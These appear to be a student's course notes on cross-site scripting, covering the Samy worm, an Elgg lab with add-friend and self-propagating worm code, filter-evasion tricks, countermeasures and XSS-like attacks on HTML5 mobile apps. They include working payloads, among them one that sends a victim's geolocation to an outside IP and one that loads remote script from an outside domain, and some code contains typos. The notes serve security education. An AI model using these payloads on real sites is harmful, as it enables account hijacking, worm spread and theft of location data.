# Week 6 Cross-Site Scripting Attack
## Directory
- [Home](/README.md#table-of-contents)
- [Week 5 The Web Technologies and Cross-Site Request Forgery Attack](/week5/README.md#week-5-the-web-technologies-and-cross-site-request-forgery-attack)
- **&rarr;[Week 6 Cross-Site Scripting Attack](/week6/README.md#week-6-cross-site-scripting-attack)**
- [Week 7 SQL Injection and Clickjacking](/week7/README.md#week-7-sql-injection-and-clickjacking)

## 6.2 Cross-Site Sripting Attack
([top](#directory))

## 6.3 The Samy Worm Story
([top](#directory))

- Samy Kamkar
  - xss on myspace

## 6.4 How XSS Attack Works
([top](#directory))

- sessions
  - users send session cookies (SID)
- CSRF is fixed
- can steal SID by sniffing, unless traffic is encrypted...
  - not ideal

### How XSSS Attack Works: Code Injection

- attacker
  - attacker cannot inject code directly into victim page
- victim
- server
  - code needs to come from the webserver

### Non-Perisistent (Reflected) XSS Attack

- What you send is what you get back
  - google a term,  you see the term returned

- Attacker website
  - send a link with code in it
  - send cross site request
    - reply with js code in the response
  - start with attacker page
    - eventually code is executed in victim's page 

### Persistent XSS Attack

- attacker account
  - attacker can put javascript code in their profile
  - `<script>alert("alert")</script>`
  - this is my profile page
- victime account
  - victim looks at attackers profile and the script is in the victim's page
  - if the code is executed, it is executed as the victim
- server

### Damage

- web defacing
- forge requests
  - this is not CSRF request
  - same-site request
- steal information

## 6.5 Attack 1: Add Friend
([top](#directory))

Elgg


- Alice
  - malicious javascript code
  - add samy as friend
- Elgg server

- HTTP GET request
- code injection
- CSRF counter measures are implemented

```html
<script type="javascript">
//<![CDATA[
//don't want to cache these thy could change for every request
elgg.config.lastcache = 1420864370;
elgg.config.viewtype = 'default';
elgg.config.simplecache_enabled = 1;

elgg.security.token.__elgg_ts = 1464276688;
elgg.security.token.__elgg_token = '273375df8111862d3759d35e562748';

elgg.page_owner = {"guid":42,"type":"user","subtype":false,"time_created":"before the dome is ready but elgg's js framework is ful initialized"};
elgg.trigger_hook('boot','system');
//]]>
</script>
```

### Send add-friend request

#### Construc thte URl

```js
var ts = "&__elgg_ts"+elgg.security.token.__elgg_ts;
var token = "&__elgg_token="+elgg.security_token.__elgg_token;

var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=50"+token+ts;
```

#### Write the Ajax Code

```js
var ajax = new XMLHttpRequest();
ajax.open("GET",sendurl,true);
ajax.sendRequestHeader("Host","www.xsslabelgg.com");
ajax.sendRequestHeader("Content-Type","application/x-www-form-urlencoded");
ajax.send();
```

## 6.6 Attack 2: Modify Profile

([top](#directory))

### Attack: Modify Profile

- malicious JS code - HTTP POST Request


## 6.7 Self-Propagation Worm
([top](#directory))

- samy

- alice
  - save malicious code to save in Alice's profile
  - profile
> samy is my hero
> `maliciousJsCode(){...}`


- charlie
  - charly looks at alice's code and code is copied
  - profile
> samy is my hero
> `maliciousJsCode(){...}`

### Get a Copy of Self

```html
<script id=worm>
var strCode=document.getElementById("worm").innerHTML;

alert(strCode);
</script>

```

```html
<script id="worm" type="text/javascript">
var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
var jsCode=document.getElementById("worm").innerHTML;
var tailTag="</"+"script>";

var wormCode = encodeURIComponent(headertag+jsCode+tailTag);

var desc = "&description=SAMY+is+my+hero"+wormCode;
desc+="&accesslevel%5Bdescription%5d=2";
...code omitted...
</script>
```

## 6.8 Countermeasures
([top](#directory))

### Fundamental Causes

Data+Code

**Profile**
> Data
> Code

Server will store code thinking it is data

**Counter Measure**
- filter out code
- turn code into data
- isolate data from code

### Filtering Out JavaScript Code

- filter out `<script>` `<body>` `onClick` `onAnyThing`
```html
<div type="backgroud:url('javascript:alert(1)')">
```

- filter out the word `javascript`
```html
<div style="backgroud:url('java
            script:alert(1)')">
```

- filter out the word `onreadystatechange`
```js
eval('xmlhttp.onread'+'ystatechange = callback');
```

### Sanitize untrusted HTML
- use an existing sanitizer
- **Jsoup**

### HTML Encoding

PHP htmlspecialchars() function
before the server sends to the data back, encode the data

- '&' becomes '\&amp;'
- etc

## 6.9 Review Questions

#### What are the differences between XSS and CSRF attacks?

- CSRF
  - requests come from a different website than target website
  - cross-site request
- XSS
  - request comes from target website
  - same-site request

#### Can the CSRF countermeasures protect agains the XSS attacks?

- no

## 6.10 XSS-Like Attack on Mobile Apps

HTML5-Based Mobile App

- android
  - java
- ios
  - object-c

- HTML5 based apps
  - javascript: coding
  - HTML+CSS: UI
  - Web Container (webview in android)

### PhoneGap Framework
- webview
  - **sandbox**
  - web is designed to run untrusted code
- PhoneGap
  - middleware
- PhoneGap plugins
  - camaera
  - sms
  - contact

### Code Injection Attacks on Mobile Apps

- page
  - app running
  - app runs the code, but does not display
- data comes into app

### Potential Attacks

## 6.11 How to Attack
([top](#directory))

### Attack Code

2D bar code
```
<img src=x onerror=navigator.geolocation.watchPosition(
  function(loc){
    m='Latitude:'+loc.coords.latitude+
    '\n'+'Longitude:'+loc.coords.longitude;
    alert(m);
    b=document.createElement('img');
    b.src='http://128.***.213.66:5555?c='+m))
  }
)>
```

### Vulnerable Code and App

1. Data Channel
2. API


## 6.12 More Attack Scenarios

- html5
  - free wifi?
  - pair with bluetooth?
  - NFC
  - 2D barcode

  - sms
  - fm
  - mp3/4
  - jpg

### attack on wifi scanning
- set the name to the attack script
- `<script>alert("attack")</attack>`

### Overcome 32-Byte Limit

`<img src onerror=$.getScript('http://mu.gl')>`


```html
<img src onerror=a="$.getScr">
<img src onerror=b="ipt('ht">
<img src onerror=c="tp://mu.">
<img src onerror==d="gl')">
<img src onerror=eval(a+b+c+d)>
```

## 6.13 Demo

## 6.14 Summary
([top](#directory))

- cross-site scripting attack: how it works
- how to launch the xss attack
- countermeasures
- xss-like attack on mobile apps
